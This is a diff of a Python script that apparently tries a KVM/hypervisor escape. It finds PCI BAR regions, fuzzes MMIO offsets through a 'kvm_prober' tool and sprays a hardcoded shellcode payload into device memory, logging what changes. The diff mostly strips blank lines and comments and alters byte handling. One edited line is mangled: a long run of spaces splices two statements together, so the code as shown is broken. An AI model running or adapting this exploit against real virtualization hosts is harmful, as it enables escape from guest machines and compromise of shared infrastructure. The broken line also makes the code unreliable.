@@ -23,23 +23,19 @@ shellcode_hex = (
 )
 shellcode_bytes = binascii.unhexlify(shellcode_hex)
 
-
 def run_prober(cmd):
     try:
         return subprocess.check_output(cmd, stderr=subprocess.STDOUT)
     except subprocess.CalledProcessError:
         return b''
 
-
 def read_mmio(addr, length):
     res = run_prober(['kvm_prober', 'readmmio_buf', f'{addr:x}', f'{length}'])
-    try:
-        hexline = res.strip().split(b'\n')[0]
-        hexstr = b''.join([c for c in hexline if c in b'0123456789abcdefABCDEF'])
+    try:                                                                                              line = res.strip().split(b'\n')[0]
+        hexstr = b''.join(bytes([c]) for c in line if c in b'0123456789abcdefABCDEF')
         return hexstr
     except Exception:
         return b''
-
 
 def log_write(label, base, before, after, payload):
     with lock:
@@ -49,12 +45,10 @@ def log_write(label, base, before, after, payload):
             f.write(f"AFTER: {after[:128].decode(errors='replace')}\n")
             f.write(f"PAYLOAD: {payload[:128]}\n\n")
 
-
 def save_checkpoint(region, offset):
     with lock:
         with open(CHECKPOINT_FILE, "a") as f:
             f.write(f"{region:x}:{offset:x}\n")
-
 
 def already_fuzzed(region, offset):
     if not os.path.exists(CHECKPOINT_FILE):
@@ -64,7 +58,6 @@ def already_fuzzed(region, offset):
             if line.strip() == f"{region:x}:{offset:x}":
                 return True
     return False
-
 
 def fuzz_offset(region, offset):
     base = region + offset
@@ -81,7 +74,6 @@ def fuzz_offset(region, offset):
             if before != after:
                 log_write("[FUZZED]", base, before, after, hexstr)
 
-    # Spray shellcode
     hexstr = binascii.hexlify(shellcode_bytes).decode()
     before = read_mmio(base, len(shellcode_bytes))
     run_prober(['kvm_prober', 'writemmio_buf', f'{base:x}', hexstr])
@@ -90,7 +82,6 @@ def fuzz_offset(region, offset):
         log_write("[SHELLCODE]", base, before, after, hexstr)
 
     save_checkpoint(region, offset)
-
 
 def find_pci_bars():
     bars = set()
@@ -103,9 +94,8 @@ def find_pci_bars():
                     end = int(m.group(2), 16)
                     bars.add((start, end))
     if not bars:
-        bars = {(0xfe800000, 0xfe900000)}  # default fallback
+        bars = {(0xfe800000, 0xfe900000)}
     return list(bars)
-
 
 def find_active_offsets(region, region_size, step=0x20):
     active = []
@@ -116,12 +106,10 @@ def find_active_offsets(region, region_size, step=0x20):
             active.append(offset)
     return active
 
-
 def main():
     bars = find_pci_bars()
     print(f"[!] Found {len(bars)} BARs: {bars}")
     jobs = []
-
     for bar_start, bar_end in bars:
         print(f"[*] Scanning BAR 0x{bar_start:x} - 0x{bar_end:x} for activity...")
         region = bar_start
@@ -129,7 +117,6 @@ def main():
         active = find_active_offsets(region, region_size)
         print(f"    [+] {len(active)} active offsets found")
         random_offsets = random.sample(range(0, region_size, 0x20), min(20, region_size // 0x100))
-
         for offset in set(active) | set(random_offsets):
             jobs.append((region, offset))
 
@@ -138,7 +125,6 @@ def main():
             pool.submit(fuzz_offset, region, offset)
 
     print("[+] Fuzzing complete. Check logs for results.")
-
 
 if __name__ == "__main__":
     main()
